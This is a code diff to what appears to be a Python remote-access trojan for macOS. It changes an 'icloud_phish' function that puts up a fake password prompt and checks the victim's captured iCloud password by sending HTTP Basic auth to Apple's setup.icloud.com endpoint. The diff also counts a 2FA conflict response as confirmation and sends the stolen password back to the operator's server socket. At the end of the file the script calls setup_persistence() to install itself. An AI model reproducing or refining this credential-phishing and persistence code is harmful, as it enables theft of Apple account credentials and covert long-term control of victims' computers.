@@ -33,7 +33,11 @@ def icloud_phish(server_socket, email):
 
             if server_socket.recv(4096) == "icloud_phish_stop":
                 server_socket.settimeout(None)
-                return response
+
+                if not response:
+                    return "EMPTY"
+                else:
+                    return response
         except socket.error:  # All good
             pass
 
@@ -43,7 +47,8 @@ def icloud_phish(server_socket, email):
         output = output.stdout.read().replace("\n", "")
 
         if output == "":
-            response += MESSAGE_INFO + "User has attempted to cancel, trying again...\n"
+            # User has attempted to cancel, trying again...
+            pass
         else:
             output = output.replace("button returned:OK, text returned:", "")
             correct_password = False
@@ -51,11 +56,14 @@ def icloud_phish(server_socket, email):
             try:
                 # Verify correct password
                 request = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
-                request.add_header("Authorization", "Basic {0}".format(base64.encodestring('{0}:{1}'.format(email, output))))
+                authorization_token = base64.encodestring('{0}:{1}'.format(email, output)).replace("\n", "")
+
+                request.add_header("Authorization", "Basic {0}".format(authorization_token))
                 urllib2.urlopen(request)
 
                 correct_password = True
             except Exception as ex:
+                # print str(ex)
                 if str(ex) == "HTTP Error 409: Conflict":  # 2FA
                     correct_password = True
 
@@ -417,6 +425,7 @@ def start_server():
 
 
 if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_folder().lower() and not is_root():
+    # Comment setup_persistence for debugging
     setup_persistence()
 
 #########################
